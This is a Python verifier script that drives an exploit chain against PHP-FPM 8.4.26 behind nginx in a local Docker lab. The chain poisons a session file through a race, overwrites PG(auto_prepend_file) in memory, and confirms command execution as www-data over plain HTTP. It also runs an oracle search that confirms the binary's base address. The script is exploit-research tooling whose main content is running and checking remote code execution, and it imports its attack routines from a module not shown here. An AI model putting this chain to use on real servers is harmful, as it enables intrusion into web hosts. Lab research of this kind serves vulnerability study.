#!/usr/bin/env python3
"""Verifier for fpm_pgpersist_race (session-poison -> PG auto_prepend chain).
Proves the chain lands uid=www-data over plain nginx HTTP (no app include param,
no published FCGI socket), then exercises the sink-free
oracle-driven binbase confirmation (wrong candidate bases rejected, true base
confirmed). Exit 0 iff the chain lands and the oracle search is correct; the
clean write8 and the binbase seed are /proc-sourced in the lab (reported in P4).

Lab bring-up: docker compose -f docker-compose.fpm-avenues.yml -p p2s-grail
--profile grail up -d --build (nginx:8134 -> php-fpm 8.4.26, pm=static,
max_children=6, no host-published fpm socket). Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(os.path.dirname(_HERE))
_COMPOSE = os.path.join(_ROOT, "docker-compose.fpm-avenues.yml")


def _load(name, filename):
    spec = importlib.util.spec_from_file_location(
        name, os.path.join(_HERE, filename))
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


G = _load("fpm_pgpersist_race", "fpm_pgpersist_race.py")


def _dc(*args, timeout=600):
    return subprocess.run(["docker", "compose", "-f", _COMPOSE,
                           "-p", "p2s-grail", "--profile", "grail", *args],
                          capture_output=True, text=True, timeout=timeout)


if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)
from common.labharness import wait_ready  # noqa: E402


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8134)
    ap.add_argument("--service", default="grail-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--no-build", action="store_true",
                    help="assume the lab is already up")
    ap.add_argument("--keep", action="store_true",
                    help="leave the lab running at the end")
    a = ap.parse_args(argv)

    # grouped-compose isolation for the imported helper module (G), whose
    # `docker compose -f _COMPOSE exec ...` calls inherit os.environ.
    os.environ["COMPOSE_FILE"] = _COMPOSE
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-grail"
    os.environ["COMPOSE_PROFILES"] = "grail"

    sid = "0123456789abcdef0123456789abcdef"
    brought_up = False
    try:
        # ---- P0: lab up ----
        if not a.no_build:
            print("[P0] docker compose up --build ...")
            r = _dc("up", "-d", "--build")
            if r.returncode != 0:
                print(r.stdout[-800:]); print(r.stderr[-800:])
                print("[P0] FAIL: compose up"); return 2
            brought_up = True
        if not wait_ready(a.host, a.port):
            print("[P0] FAIL: plain.php never answered 200 on "
                  f"{a.host}:{a.port}"); return 2
        print(f"[P0] lab ready: nginx http://{a.host}:{a.port} "
              "(fpm port NOT published)")

        # ---- P1: core_globals + base ----
        cg, how = G.derive_core_globals(_COMPOSE, a.service)
        pids = G.worker_pids(_COMPOSE, a.service)
        base = G.fpm_base_of(_COMPOSE, a.service, pids[0]) if pids else None
        print(f"[P1] core_globals = {cg:#x}  ({how})")
        print(f"[P1] workers = {pids}  fpm_base = {base:#x}")
        print(f"[P1] PG(auto_prepend_file) = {base + cg + 0xa0:#x}")
        if cg != 0x16e1580:
            print(f"[P1] NOTE: derived {cg:#x} differs from the baked "
                  "0x16e1580 (using derived)")

        # ---- P2: full chain ----
        print("[P2] FULL CHAIN: race-poison -> write8 PG(apf) -> plain-GET oracle")
        rep = G.run(a.host, a.port, _COMPOSE, a.service, cmd=a.cmd,
                    sid=sid, parts=a.parts, base="/plain.php", verbose=True)
        p2_ok = bool(rep.get("rce_ok")) and "uid=" in (rep.get("cmd_output") or "")
        print(f"[P2] poison_on_disk={rep.get('poison_on_disk')} "
              f"write8_calls={rep.get('write8_calls')} "
              f"probes={rep.get('oracle_probes')}")
        print(f"[P2] cmd_output: {rep.get('cmd_output')!r}")
        print(f"[P2] {'PASS' if p2_ok else 'FAIL'}: "
              f"uid via plain HTTP, no include param, no published fpm socket")

        # ---- P3: sink-free oracle-driven binbase confirmation ----
        print("[P3] RESEARCH: oracle-driven binbase CONFIRMATION (no sink)")
        w = G.GdbWrite8(_COMPOSE, a.service)
        G.pg_persist.uninstall(base, G.FPM_8426_OFFSETS, w.write8)
        silent_ok, _o, _p = G.confirm_rce(a.host, a.port, sid=sid, tries=3,
                                          verbose=False)
        print(f"[P3] control: PG=NULL -> oracle fired? {silent_ok} (expect False)")
        sess = f"/var/sess/sess_{sid}"
        cands = [base - 0x200000, base + 0x400000, base]
        found, probes, trail = G.oracle_search(
            a.host, a.port, _COMPOSE, a.service, sess, cands, sid=sid,
            verbose=True)
        p3_ok = (found == base) and (not silent_ok)
        print(f"[P3] confirmed base = {found and hex(found)} "
              f"(true {base:#x}); {probes} probes over {len(cands)} candidates")
        print(f"[P3] {'PASS' if p3_ok else 'FAIL'}: wrong bases rejected, "
              "true base confirmed, zero reflecting-unserialize sink")

        # ---- P4: honest boundary ----
        seed = rep.get("var_hash_rw_seed_proc", {})
        print("[P4] HONEST BOUNDARY")
        print("     app-free / socket-free / sink-free over nginx HTTP:")
        print("       - race poison to save_path/sess_<sid>  : YES")
        print("       - PG(auto_prepend_file) dispatch        : YES (no include, no FCGI PHP_VALUE)")
        print("       - auto_prepend-firing success oracle     : YES (sink-free confirmation)")
        print("     the ONE write (var_hash_rw-class) residual:")
        print(f"       - binbase (var_hash_rw input)  : {seed.get('binbase') and hex(seed['binbase'])}  <- {seed.get('source')}")
        print(f"       - chunk   (var_hash_rw input)  : {seed.get('chunk') and hex(seed['chunk'])}  <- {seed.get('source')}")
        print("       - oracle CONFIRMS a guess sink-free, but cannot DISCOVER")
        print("         these from nothing (single axis ~2^28, joint ~2^56).")
        print("       - var_hash_rw 16-byte write also pollutes PG(auto_append_file)@+0xa8;")
        print("         clean write8 here = gdb (pg_persist mechanism proof).")

        ok = p2_ok and p3_ok
        print(f"\n[RESULT] {'PASS' if ok else 'FAIL'}: grail chain "
              f"{'landed uid=www-data' if p2_ok else 'did NOT land'}; "
              f"oracle search {'OK' if p3_ok else 'FAILED'}")
        return 0 if ok else 1
    finally:
        if brought_up and not a.keep:
            print("[cleanup] docker compose down")
            _dc("down", timeout=120)


if __name__ == "__main__":
    raise SystemExit(main())
